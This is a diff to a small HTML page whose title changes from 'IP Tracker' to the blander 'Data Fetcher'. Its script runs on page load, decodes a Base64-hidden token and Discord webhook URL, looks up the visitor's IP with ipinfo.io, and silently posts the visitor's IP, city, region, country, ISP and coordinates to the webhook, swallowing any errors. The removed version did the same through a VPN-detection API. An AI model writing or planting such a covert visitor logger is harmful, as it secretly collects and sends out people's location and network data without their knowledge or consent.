@@ -3,50 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Tracker</title>
+    <title>Data Fetcher</title>
 </head>
 <body>
     <script>
-        // Base64 encoded values
-        const apiKeyBase64 = 'NDEyMjk4ZDY0ZTRmNGZiZmJiOGVlOTA1ZGEyMGVjY2E=';
-        const webhookUrlBase64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==';
+        // Encoded values for IPinfo token and webhook URL
+        const encodedToken = 'YWZiY2U5OWUwOTk5ZWQ=';
+        const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==';
 
-        // Function to decode Base64 strings
-        function decodeBase64(encoded) {
-            return atob(encoded);
+        // Decode Base64 values
+        const token = atob(encodedToken);
+        const webhookUrl = atob(encodedWebhook);
+
+        // Fetch IP data from IPinfo and send it to the Discord webhook
+        async function fetchDataAndSend() {
+            try {
+                // Fetch IP info data
+                const response = await fetch(`https://ipinfo.io/json?token=${token}`);
+                const data = await response.json();
+
+                // Prepare message payload
+                const payload = {
+                    content: `Location Data:\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrganization: ${data.org}\nCoordinates: ${data.loc}\nTimezone: ${data.timezone}`
+                };
+
+                // Send data to Discord webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                // Handle any errors silently
+            }
         }
 
-        async function fetchAndSendData() {
-            // Decode the Base64 values
-            const apiKey = decodeBase64(apiKeyBase64);
-            const webhookUrl = decodeBase64(webhookUrlBase64);
-
-            // Fetch data from the VPN API
-            const response = await fetch(`https://vpnapi.io/api/auto?key=${apiKey}`);
-            const data = await response.json();
-
-            const city = data.location.city || "Unknown";
-            const region = data.location.region || "Unknown";
-            const country = data.location.country || "Unknown";
-            const ip = data.ip || "Unknown";
-            const isVPN = data.security.vpn ? "Yes" : "No";
-
-            // Create the message payload
-            const messagePayload = {
-                content: `IP: ${ip}\nLocation: ${city}, ${region}, ${country}\nVPN: ${isVPN}`
-            };
-
-            // Send the message to the Discord webhook
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(messagePayload)
-            });
-        }
-
-        fetchAndSendData();
+        // Execute the function
+        fetchDataAndSend();
     </script>
 </body>
 </html>
